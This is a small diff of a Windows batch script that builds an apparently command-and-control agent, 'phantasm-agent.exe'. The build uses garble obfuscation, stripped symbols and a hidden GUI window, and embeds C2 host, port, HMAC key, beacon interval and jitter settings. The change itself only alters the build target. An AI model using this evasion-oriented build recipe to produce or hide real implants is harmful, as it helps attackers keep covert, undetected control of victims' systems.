@@ -54,7 +54,7 @@ if %ERRORLEVEL% NEQ 0 (
 echo [*] Building with garble obfuscation...
 
 REM Build with garble - add -s -w to strip symbols
-garble -literals -tiny build -ldflags "-s -w -H windowsgui -X main.listenerHost=%C2_HOST% -X main.listenerPort=%C2_PORT% -X main.listenerEndpoint=%C2_ENDPOINT% -X main.hmacKeyHex=%HMAC_KEY% -X main.reconnectIntervalStr=%BEACON_INTERVAL% -X main.jitterSecondsStr=%JITTER%" -o phantasm-agent.exe main.go
+garble -literals -tiny build -ldflags "-s -w -H windowsgui -X main.listenerHost=%C2_HOST% -X main.listenerPort=%C2_PORT% -X main.listenerEndpoint=%C2_ENDPOINT% -X main.hmacKeyHex=%HMAC_KEY% -X main.reconnectIntervalStr=%BEACON_INTERVAL% -X main.jitterSecondsStr=%JITTER%" -o phantasm-agent.exe .
 
 if %ERRORLEVEL% NEQ 0 (
     echo.
